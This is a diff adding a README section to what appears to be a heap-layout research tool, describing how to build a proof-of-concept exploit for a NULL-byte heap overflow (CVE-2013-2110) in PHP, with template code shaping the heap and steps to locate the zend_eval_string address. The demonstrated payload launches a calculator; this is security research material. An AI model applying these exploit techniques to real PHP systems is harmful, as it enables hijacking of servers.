@@ -225,6 +225,60 @@ $ wc -l /tmp/output/*
   1733 total
 ```
 
+### Generating an Exploit for PHP
+
+In the templates directory, the file `cve-2013-2110-exploit.template.php`
+contains a template for an exploit for PHP. For a more detailed explanation see
+[this][1] blog post. The vulnerability allows us to write a single NULL byte
+immediately after a buffer allocated by `quoted_printable_encode`. The
+exploitation strategy is to use this overflow to correct a pointer that
+resides at the start of a `gdImage` structure allocated by `imagecreate`.
+
+The beginning of the template encodes this required layout as follows:
+
+```php
+<?php
+#X-SHRIKE TEMPLATE-VERSION 2
+
+$quote_str = str_repeat("\xf4", 123);
+#X-SHRIKE HEAP-MANIP 384
+#X-SHRIKE RECORD-ALLOC 0 1
+$image = imagecreate(1, 2);
+#X-SHRIKE HEAP-MANIP 384
+#X-SHRIKE RECORD-ALLOC 0 2
+quoted_printable_encode($quote_str);
+
+#X-SHRIKE REQUIRE-DISTANCE 1 2 384
+
+...
+```
+
+Then the rest of the exploit proceeds, under the assumption that the correct
+layout has been achieved. The template can be provided to the `solve.py` script
+as before. When the discovered solution is run it should result in the hijacking
+of the program's control flow and `gnome-calculator` will be executed. A demo of
+this process can be seen [here][4].
+
+If you want to generate the exploit for yourself you will need to modify a
+hardcoded address that is found on line 97 of the template. (Or if you want you
+can update the exploit to leak the address ;)). It looks as follows:
+
+```php
+$zend_eval_string_addr = 0x95fd61;
+```
+
+The address of `zend_eval_string` in your binary may differ. To find it run the
+following:
+
+```
+readelf -s PHP-SHRIKE/install/bin/php | grep zend_eval_string
+```
+
+Make sure you take the address for the correct function as there are 3 variants
+of it with slightly different names.
+
+
 [1]: https://sean.heelan.io/heaplayout
 [2]: https://github.com/SeanHeelan/PHP-SHRIKE
 [3]: https://sean.heelan.io
+[4]: https://www.youtube.com/
